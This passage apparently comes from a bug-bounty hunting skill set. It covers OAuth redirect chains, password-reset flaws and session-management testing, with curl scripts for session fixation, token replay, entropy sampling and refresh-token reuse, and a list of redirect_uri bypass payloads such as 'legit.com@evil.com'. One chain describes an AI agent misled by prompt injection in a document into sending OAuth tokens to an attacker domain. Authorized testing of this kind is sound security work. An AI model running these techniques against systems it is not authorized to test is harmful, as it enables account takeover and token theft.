**Operational rule:** the WHATWG URL parser (used by all modern browsers since 2018) does userinfo parsing ONLY in the authority section — i.e., **before the first `/` after `://`**. Once the path begins, `@` is just a character. Server-side string-startswith checks don't model this — they pass URLs the browser will then route to the legitimate host.

**Always headless-test (Playwright / Puppeteer / a real browser) the final navigation BEFORE writing the OAuth finding as ATO-chain.** Server-side accept + browser-side stay-on-legitimate-host = **not** ATO. Verified live in `docs/verification/phase3-playwright-browser-execution.md` Test 29.

---

## Related Skills & Chains

- **`hunt-subdomain`** — The single highest-impact OAuth chain. Chain primitive: OAuth `redirect_uri` validator accepts any `*.target.com` subdomain + recon reveals `dev-staging.target.com` CNAMEs to a deprovisioned Heroku/S3/Azure app → claim the dangling subdomain → host an OAuth callback receiver there → craft `/oauth/authorize?redirect_uri=https://dev-staging.target.com/cb` → victim clicks → auth code lands on attacker-claimed subdomain → exchange for token → ATO. The redirect_uri whitelist passed because the subdomain is "legitimately" under target.com control.
- **`hunt-ato`** — OAuth state-CSRF is the textbook ATO-via-account-linking primitive. Chain primitive: `state` parameter absent or not session-bound + victim is already logged into target.com + attacker initiates OAuth flow from their own account, captures `code` before exchange + crafts callback URL with attacker's code → forces victim to visit → victim's target.com session is now linked to attacker's Google/Facebook identity → attacker logs in via Google → owns victim's account.
- **`hunt-llm-ai`** — Modern OAuth flows for AI agents (ChatGPT plugins, Claude MCP servers, agentic copilots) reuse OAuth 2.1 + PKCE. Chain primitive: agentic AI accepts `redirect_uri` from indirect prompt-injection in a document → model crafts OAuth authorize URL with attacker callback → user clicks "approve" thinking it's the agent's own flow → tokens exfiltrated via tool-use to attacker domain.
- **`hunt-saml`** — When OAuth is layered atop a SAML IdP, the IdP-level XSW becomes the OAuth ATO path. Chain primitive: SAML SP that issues OAuth tokens after assertion-validation + XSW attack on the assertion alters `NameID` to admin user → SP issues OAuth token bearing admin identity → OAuth-scoped APIs grant admin access.
- **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host-confusion `legit.com@evil.com`, `legit.com.evil.com`, path-traversal, parameter pollution, encoded-slash `%2F`, fragment-injection `#legit.com`) and the open-redirect chain catalog when exact-match validation forces you to find an open-redirect on the whitelisted domain first.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an OAuth "open redirect" that doesn't actually leak a token (only the `state` param, or the callback page doesn't include credentials in URL). State-only leakage is Low; token/code leakage with successful exchange demonstration is Critical. The exchange-the-code step is non-negotiable.


---

## hunt-forgot-password — Hunting Methodology (real BB reports)

## Autonomous Testing Priority

**Start with username enumeration — it's the fastest win and gates the rest.**

**Pattern 1 — Username enumeration (response difference for valid vs invalid email):**
1. POST to the forgot-password endpoint with a clearly invalid email (e.g. `nonexistent@fakedomain12345.com`) — record the response body, status code, and length
2. POST with an email you know exists (or try common patterns like `admin@target.com`, `test@target.com`, `user@target.com`)
3. Compare responses: different message ("Email sent" vs "Email not found"), different HTTP status, or meaningfully different body length = username enumeration confirmed
4. Proof: enumeration is confirmed when the two responses differ measurably (baseline vs probe) in message text, status code, or body length

**Pattern 2 — Reset token exposed in the API response:**
Some APIs return the reset token directly in the response body (instead of only emailing it). POST to the forgot-password endpoint and look for a token, link, or code in the JSON/HTML response. If a token appears that lets you reset the password, that's an immediate account-takeover vector.

**Pattern 3 — Reset token replay (reuse after use):**
1. Complete a full password reset cycle: request token → use it to reset password
2. Immediately try submitting the same token again to the reset-password endpoint
3. If the second submission returns 200 or "success" → token not invalidated after use

**Pattern 4 — No rate limit on reset requests:**
Submit the forgot-password endpoint 10-20 times rapidly with the same email. If all succeed without a 429, lockout, or CAPTCHA → no rate limit (enumeration + token flooding is possible).

**Content-type:** Forgot-password endpoints are often JSON-based REST APIs. Use `application/x-www-form-urlencoded` only if the endpoint is a traditional HTML form (check the login page's HTML to determine form encoding).

**Proof:** Username enumeration = measurably different response (body/status/length). Token exposure = token in response body. Token replay = second successful use of a consumed token.

---

## Vulnerability Classes in This Skill

### 1. Username Enumeration via Password Reset
Different error messages for valid vs invalid accounts leaks the user list without authentication. Even timing differences (fast "no user found" vs slow "email queued") count.

High-value targets: admin accounts, employee email patterns, API keys derived from usernames.

### 2. Weak / Predictable Reset Tokens
A reset token derived from timestamp, username, or sequential IDs can be brute-forced:
- `base64(email + timestamp)` — decodable
- 4-6 digit numeric code — 10K guesses, easily feasible with no rate limit
- Sequential `token=1234`, `token=1235` — trivially enumerable

### 3. Token Not Bound to Session or IP
Most apps generate a token, email it, and accept it from any browser. A truly bound token should only work from the same IP or require the original session cookie. If neither is enforced → link forwarding = account takeover.

**Token leak via `Referer` / third-party resources.** When the token rides in the reset-page URL (`/reset?token=…`) and that page loads any cross-origin resource (analytics, ads, fonts, a CDN image), the full URL — token included — leaks to that third party in the `Referer` header. Check the reset page's outbound requests: if the token appears in any cross-origin `Referer`, it's harvestable without the victim's inbox. Same leak via a `<meta name=referrer>` misconfig or an outbound link the victim clicks from the reset page. Disclosed token-leak→ATO class: <https://hackerone.com/reports/173551>.

### 4. Reset Link Doesn't Expire
Common best practice: reset tokens expire within ~15–60 minutes (no hard RFC mandates the exact value; OWASP recommends a short, single-use lifetime). If a token from 24 hours ago still works → persistence risk for phishing attacks.

### 5. No Rate Limit on Reset Endpoint
An uncapped reset endpoint enables:
- Email flooding (DoS against victim's inbox)
- Token brute-force if the token space is small
- Username enumeration at scale

---

## Related Skills

- **`hunt-ato`** — owns the account-takeover CHAIN (password-reset is its path #1). This skill finds/proves the recovery-flow primitive; hand off to hunt-ato to assemble the full takeover.
- **`hunt-cache-poison`** — host-header injection during reset email generation (different vulnerability, same flow)
- **`hunt-brute-force`** — rate-limit testing pattern applies to the reset endpoint too
- **`hunt-auth-bypass`** — if the reset flow can be skipped entirely (go to `/reset-password?token=` with empty/null token)
- **`hunt-mfa-bypass`** — if MFA is required after reset, test the bypass there



---

## hunt-session — Hunting Methodology (real BB reports)

## Autonomous Testing Priority

**Missing HttpOnly on cookies is auto-detected — focus your active testing on lifecycle invalidation (higher impact).**

**Pattern 1 — Session survives logout (most common high-value finding):**
1. Login and note the session token/cookie value
2. Call the logout endpoint (`/logout`, `POST /api/logout`, etc.)
3. Try to use the OLD session token to access a protected resource (`/api/me`, `/dashboard`, `/account`)
4. If 200 with user data → session not invalidated on logout = ATO persistence

**Pattern 2 — Session not regenerated on login (session fixation):**
1. GET any page to receive a pre-authentication session token/cookie
2. POST valid credentials to the login endpoint
3. Compare the session token BEFORE and AFTER login
4. If the token is unchanged → session fixation vulnerability

**Pattern 3 — Session survives password change:**
1. Login → record session A value
2. Change the password via the account settings endpoint
3. Replay session A on a protected endpoint
4. If 200 → token not rotated on credential change = persistent ATO (critical chain when combined with XSS/cookie theft)

**Content-type:** Login and session endpoints vary — use `application/json` for REST APIs, `application/x-www-form-urlencoded` for traditional web forms. Try both if the first returns an unexpected response.

**Proof:** A protected-resource 200 response (with user data) using a session token that should have been invalidated confirms the finding.

---

# HUNT-SESSION — Session Management

## Crown Jewel Targets

Session fixation leading to admin hijack = Critical. Session surviving a password change = High-to-Critical (persistent ATO from a stolen cookie that the victim believes they revoked by resetting their password).

**Highest-value chains:**
- **Session fixation** — server accepts a session ID set by the client and does NOT regenerate it on login → attacker pre-plants an ID, victim authenticates, attacker rides the now-authenticated session → persistent ATO.
- **No invalidation on logout** — old token still works after `/logout` → theft window never closes.
- **No invalidation on password / email change** — a stolen session survives the victim's "I think I was hacked, let me reset" → persistent ATO. This is the single highest-paid session bug class.
- **Refresh-token reuse without rotation-detection** — a leaked refresh token mints fresh access tokens forever; no reuse-detection means the legitimate user's later refresh does NOT revoke the attacker's branch.
- **Predictable / low-entropy session ID** — sequential, timestamp- or userId-derived IDs → brute-force or compute other users' sessions.
- **JWT-as-session with no `exp` / no revocation list** — stolen JWT = permanent access; logout is cosmetic.

---

## Grounding — patterns that shaped each phase

No invented CVE/report IDs below. These are the *named, publicly-documented* patterns this skill encodes:

- **Session fixation, login-CSRF, no-regeneration-on-auth** — OWASP WSTG-SESS-03 / WSTG-SESS-01; the classic ACROS / Mitja Kolšek session-fixation paper. Highest-impact variant: fixing the session of an SSO/admin user.
- **SameSite=Lax sibling-subdomain CSRF reaching session state** — Argo CD **CVE-2024-22424** (Lax cookies sent on top-level cross-site navigations from a sibling subdomain). Use this when a session cookie relies on `SameSite=Lax` as its only CSRF defence.
- **Refresh-token rotation & automatic reuse-detection** — the Auth0/IETF OAuth-Security-BCP model: a rotated refresh token, if replayed, must invalidate the *entire token family*. Absence = the core bug to prove.
- **Device Bound Session Credentials (DBSC)** — the W3C/Chrome DBSC draft binds a session to a TPM/device key. Test the *downgrade*: does the server still accept a non-bound cookie when the DBSC challenge is stripped?
- **Cookie attribute hardening** — OWASP WSTG-SESS-02; `__Host-`/`__Secure-` prefixes per RFC 6265bis. Missing `HttpOnly` is only a finding when a real XSS/DOM sink exists (chain with `hunt-xss`/`hunt-dom`).
- **Entropy** — NIST SP 800-63B requires ≥64 bits of entropy in a session identifier. Treat anything decodable to a counter/timestamp/userId as a finding regardless of length.

Cross-refs: ATO chaining → `hunt-ato`; JWT alg/kid tampering → `hunt-api-misconfig`; OAuth code/state flaws → `hunt-oauth`; CSRF mechanics → `hunt-csrf`; cookie-theft sinks → `hunt-xss` / `hunt-dom`.

---

## Attack Surface Signals

```
Set-Cookie: session=...            # name varies: sid, JSESSIONID, connect.sid,
                                   # PHPSESSID, ASP.NET_SessionId, laravel_session, _csrf
/login /logout /api/login /oauth/token
/auth/refresh /api/token/refresh   # refresh-token rotation surface
/account/change-password /settings/email
?sid= ?session= in URL             # session-in-URL → leaks via Referer/logs (finding)
```
```
# Header signals worth flagging immediately:
Set-Cookie: session=abc; Path=/                 # no HttpOnly/Secure/SameSite
Set-Cookie: session=abc; SameSite=None          # None without Secure = rejected by modern browsers, but flag
Set-Cookie: __Host-sess=...; Secure; Path=/     # GOOD — hard to fixate
Sec-Session-Registration: ...                   # DBSC in play → test downgrade
```

---

## Step-by-Step Hunting Methodology

> **Two-session rule.** Every invalidation/fixation claim is proven with TWO concrete sessions captured by a real flow — attacker **A** and victim **B** — never with hardcoded placeholder strings. Helpers below capture real cookies from `curl`'s Netscape jar.

```bash
TARGET=target.com
JAR_A=$(mktemp); JAR_B=$(mktemp)

# Robust session-cookie extractor: handles #HttpOnly_ prefix lines and any
# cookie name (sid/JSESSIONID/connect.sid/PHPSESSID/...). Prints name=value.
get_cookie () {  # $1=jar  $2=name-regex (default: common session names)
  local jar="$1" re="${2:-session|sid|sess|JSESSIONID|connect\.sid|PHPSESSID|laravel_session}"
  awk -v re="$re" '
    /^#HttpOnly_/ { sub(/^#HttpOnly_/,""); }   # strip jar HttpOnly marker
    /^#/ { next }                              # skip remaining comments
    NF>=7 && $6 ~ re { print $6"="$7 }         # field6=name field7=value
  ' "$jar" | tail -1
}
```

### Phase 1 — Session Fixation (regeneration-on-login)
```bash
# Step 1: grab a pre-auth session the SERVER hands an anonymous client.
curl -s -L -c "$JAR_A" "https://$TARGET/login" -o /dev/null
PRE=$(get_cookie "$JAR_A"); echo "pre-auth: $PRE"

# Step 1b (stronger): can we FORCE an arbitrary ID? attacker-chosen value.
FIX="session=AAAAdeadbeefAAAA"

# Step 2: authenticate while CARRYING the pre-auth/forced cookie (reuse same jar).
curl -s -L -c "$JAR_A" -b "$JAR_A" -X POST "https://$TARGET/login" \
  -d "username=attacker@example.com&password=CorrectHorse1" -o /dev/null
POST=$(get_cookie "$JAR_A"); echo "post-auth: $POST"

# DECISION:
#  - If $POST == $PRE (value unchanged across the auth boundary) AND that value
#    now returns authenticated data → FIXATION. The server reused the anon ID.
#  - If the forced $FIX value is accepted and authenticates → CRITICAL fixation
#    (attacker controls the ID; no email/XSS needed to plant it).
AUTH=$(curl -s -L -b "$JAR_A" "https://$TARGET/api/me")
echo "$AUTH" | head -c 200
```
**FP guard:** a value *change* is not automatically safe — some apps rotate the readable cookie but keep a stable server-side session keyed by a second cookie. Diff the FULL `Set-Cookie` set and confirm the *old* value is genuinely dead (Phase 2). Also confirm `/api/me` returns *your* identity, not a generic 200/landing page.

### Phase 2 — Invalidation on Logout
```bash
# A logs in for real (fresh jar), capture A's live session.
curl -s -L -c "$JAR_A" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","password":"CorrectHorse1"}' -o /dev/null
A=$(get_cookie "$JAR_A"); echo "A=$A"

# Baseline: what does an authenticated /api/me look like for A? (capture body, not just code)
BEFORE=$(curl -s -L -b "$JAR_A" "https://$TARGET/api/me")

# Logout A.
curl -s -L -b "$JAR_A" -X POST "https://$TARGET/api/logout" -o /dev/null

# Replay A's OLD cookie value explicitly (do NOT reuse the jar — logout may have
# overwritten it). Compare body + code against the authenticated baseline.
AFTER=$(curl -s -L -H "Cookie: $A" "https://$TARGET/api/me" -w '\n[%{http_code}]')
echo "AFTER: $AFTER"
```
**FP discipline (mandatory):**
- Don't trust the status code. A cached/edge 200 or a generic SPA shell returns 200 for everyone. **Body-diff** `AFTER` against `BEFORE` — the finding is only real if `AFTER` still contains A's *unique identity marker* (email, user-id, CSRF token, account name).
- Confirm with a **negative control**: a random/garbage cookie value must NOT return the same authenticated body. If garbage also yields 200 with user data, the endpoint isn't session-gated and there's no finding here.
- Re-test after a **short delay** and from a **different IP** — some servers lazily expire on next access or pin sessions to IP.

### Phase 3 — Invalidation on Password / Email Change (persistent-ATO core)
```bash
# This is the real two-session flow. A = attacker holding a stolen/old session.
# B = the victim who changes their password believing it revokes access.
# (In a real engagement A is a session you legitimately captured for a TEST account
#  that you also control as B — never use a real third party.)

# 1) Log the TEST account in as session A, capture it.
curl -s -L -c "$JAR_A" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' -o /dev/null
SESSION_A=$(get_cookie "$JAR_A"); echo "SESSION_A=$SESSION_A"
BEFORE=$(curl -s -L -H "Cookie: $SESSION_A" "https://$TARGET/api/profile")

# 2) Log the SAME account in as session B (separate jar = "the victim's browser").
curl -s -L -c "$JAR_B" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' -o /dev/null

# 3) Victim (session B) changes the password.
curl -s -L -b "$JAR_B" -X POST "https://$TARGET/api/change-password" \
  -H 'Content-Type: application/json' \
  -d '{"old_password":"OldPass!1","new_password":"BrandNew!2"}' -o /dev/null

# 4) THE TEST: replay the OLD SESSION_A captured in step 1.
AFTER=$(curl -s -L -H "Cookie: $SESSION_A" "https://$TARGET/api/profile" -w '\n[%{http_code}]')
echo "AFTER pw-change: $AFTER"
```
**Decision + FP discipline:**
- Finding is confirmed only if `AFTER` returns 200 **and** the body still carries the account's unique data (body-diff vs `BEFORE`). A bare 200 on a public/SPA route is not proof.
- Run the **garbage-cookie negative control** again to prove the endpoint is session-gated.
- Repeat the identical flow for **email-change** (`/settings/email`) and for **logout-all-devices** — apps frequently invalidate the *acting* session (B) but not *sibling* sessions (A). That sibling-survival is the exact persistent-ATO primitive `hunt-ato` chains.
- **Severity gate:** if the change-password endpoint also lacks a current-password / MFA step-up (per `hunt-mfa-bypass`), A can pivot from read-only to full takeover → escalate.

### Phase 4 — Cookie Attribute Analysis
```bash
curl -sI -L "https://$TARGET/" | grep -i '^set-cookie'
```
- **HttpOnly** missing → cookie reachable via `document.cookie`. Only a finding **chained to a real XSS/DOM sink** (`hunt-xss`/`hunt-dom`) — note it, don't report standalone as High.
- **Secure** missing → cookie sent over cleartext HTTP; pair with `hunt-tls-network` (downgrade/HSTS-gap) for a network-attacker chain.
- **SameSite** missing/`None` → CSRF reachability; `SameSite=Lax` is bypassable via sibling-subdomain top-level navigation (Argo CD **CVE-2024-22424** class) → hand to `hunt-csrf`.
- **`__Host-` / `__Secure-` prefix absent** → the session can be overwritten/fixated from a subdomain or non-secure context; its presence largely kills cookie-fixation, so flag the *absence* as the precondition for Phase 1.

### Phase 5 — Session-ID Entropy
```bash
# Collect a LARGE sample (200+) of freshly-issued IDs. -L is required: a 302
# /login often sets the cookie on the redirect target, not the first response.
N=200; SAMP=$(mktemp)
for i in $(seq 1 $N); do
  J=$(mktemp)
  curl -s -L -c "$J" "https://$TARGET/login" -o /dev/null
  get_cookie "$J" | cut -d= -f2- >> "$SAMP"
  rm -f "$J"
done
sort "$SAMP" | uniq -d | head            # duplicates = catastrophic (re-use)
awk '{print length($0)}' "$SAMP" | sort -n | uniq -c   # length distribution
```
Then analyse, don't eyeball:
- **Sequential / monotonic** — `sort -n` the decoded values; a steady +1/+N delta = predictable.
- **Decodable structure** — `base64 -d` / hex-decode each ID and look for embedded `userId`, unix timestamps, or PIDs.
- **Bit entropy** — feed the raw bytes to `ent` or `dieharder`; NIST SP 800-63B wants ≥64 bits. 10 samples is far too few to claim anything — gather hundreds.
- **FP guard:** a long random-*looking* token is not proof of strength; only structural decode + a large-sample entropy estimate is. Conversely a short token with high per-char entropy may still be fine — measure, don't count characters.

### Phase 6 — JWT-as-Session
```bash
JWT="eyJ..."        # captured from Authorization: Bearer or a cookie
# Decode header + payload safely (base64url padding fix).
b64url(){ local s="${1//-/+}"; s="${s//_//}"; printf '%s' "$s===" | base64 -d 2>/dev/null; }
b64url "$(cut -d. -f1 <<<"$JWT")" | jq .   # header: alg, kid
b64url "$(cut -d. -f2 <<<"$JWT")" | jq .   # claims: exp, iat, sub, jti
```
- **`exp` missing or years out** → no expiry. **`jti` missing** → server cannot maintain a revocation list → logout can't truly revoke.
- **Revocation test:** logout, then replay the *same* JWT against `/api/me`. If it still returns the user → tokens are not server-revocable; this is the JWT-session persistence finding. Body-diff to avoid a cached 200.
- **Tampering (alg/kid/key-confusion) is owned by `hunt-api-misconfig`** — hand off `jwt_tool $JWT -T` / `-X a` there rather than duplicating it.

### Phase 7 — Refresh-Token Rotation & Reuse-Detection
```bash
# 1) Obtain a refresh token (login or /oauth/token), then rotate it once.
RT1=$(curl -s -L -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' | jq -r '.refresh_token')

# 2) Use RT1 to mint a new access token — server SHOULD return a rotated RT2.
R2=$(curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT1\"}")
RT2=$(jq -r '.refresh_token' <<<"$R2"); echo "rotated? RT1!=RT2 -> $([ "$RT1" != "$RT2" ] && echo yes || echo NO-ROTATION)"

# 3) REUSE-DETECTION test: replay the OLD RT1 again (simulating the leaked token).
REPLAY=$(curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT1\"}" -w '\n[%{http_code}]')
echo "RT1 replay: $REPLAY"

# 4) Then confirm RT2 was KILLED by the replay (correct BCP behaviour invalidates
#    the whole family). If RT2 still works after RT1 was replayed → no family-revocation.
curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT2\"}" -w '\n[%{http_code}]'
```
**Findings:** no rotation (RT1==RT2) = a long-lived stealable credential; rotation **without** reuse-detection (RT1 replay still mints tokens, or RT2 survives the replay) = the leaked-token-persistence bug per the OAuth Security BCP. **OOB note:** if you suspect a leaked RT via SSRF/log/JS-bundle, confirm the token's reach with `hunt-ssrf`/`hunt-source-leak`, not by guessing.

### Phase 8 — OAuth/SSO Session Linkage & DBSC Downgrade
```bash
# SSO linkage: after IdP callback, is the app session bound to the IdP session?
#  - Log out at the IdP only; replay the app session cookie. Still 200 with user
#    data → app session outlives the IdP session (single-logout gap).
# DBSC downgrade: if responses carry Sec-Session-Registration / Sec-Session-Id,
#  strip the device-bound proof header and replay the plain cookie:
curl -s -L -H "Cookie: $A" "https://$TARGET/api/me" -w '\n[%{http_code}]'
#  If the plain (non-bound) cookie is still accepted → device-binding is advisory,
#  not enforced → a stolen cookie defeats DBSC entirely.
```
Hand OAuth `state`/`redirect_uri`/code-injection to `hunt-oauth`; this phase only covers the *session-layer* binding.

---

## Chain Table

| Session finding | Chain to | Impact |
|----------------|----------|--------|
| Session fixation (forced `__Host-`-less cookie) | Trick admin/SSO user into authenticating on planted ID | Admin session takeover (Critical) |
| No logout/password-change invalidation | `hunt-xss`/`hunt-dom` cookie theft → replay surviving session | Persistent ATO past victim's reset |
| Refresh token, no reuse-detection | Leaked RT (SSRF/log/bundle) → infinite access-token minting | Persistent ATO, survives password change |
| `SameSite=Lax` only | Sibling-subdomain top-level nav (CVE-2024-22424 class) → CSRF | State change / login-CSRF → fixation |
| JWT no `exp`/`jti` | Stolen token, no server revocation | Permanent access |
| DBSC downgrade accepted | Steal plain cookie despite device-binding | Defeats the only theft mitigation |
| Predictable ID | Compute/brute another user's session | Cross-user ATO |

---

## Validation (house FP discipline)

Before claiming ANY session finding:
- **Two real sessions, not placeholders** — every fixation/invalidation claim uses A and B captured by the `curl` flows above.
- **Body-diff, never status-only** — a 200 means nothing without the account's unique identity marker present in the body, diffed against the authenticated baseline.
- **Negative control** — a garbage/random cookie must FAIL where your "surviving" cookie succeeds; otherwise the endpoint isn't session-gated and it's a non-finding.
- **Cache/edge check** — re-request with a cache-buster and from a second IP; rule out an edge-cached or IP-pinned 200.
- **OOB for theft chains** — when the impact depends on exfiltrating a cookie/token (XSS, SSRF, log leak), confirm receipt out-of-band (Collaborator) rather than asserting it.
- **Static-vs-state** — `HttpOnly`/`Secure`/`SameSite` absence is a *policy* observation; only report as High once paired with a real exploit primitive (XSS, network-MITM, CSRF). Standalone attribute gaps are Low/Informational.

**Severity:**
- Session fixation → admin/SSO takeover: **Critical**
- No invalidation on password/email change, or refresh-token reuse without detection: **High → Critical** (escalate if MFA/step-up also absent)
- Predictable/duplicate session ID: **High**
- No invalidation on logout: **Medium → High** (depends on theft vector)
- Missing `HttpOnly`/`SameSite` standalone: **Low/Informational** until chained

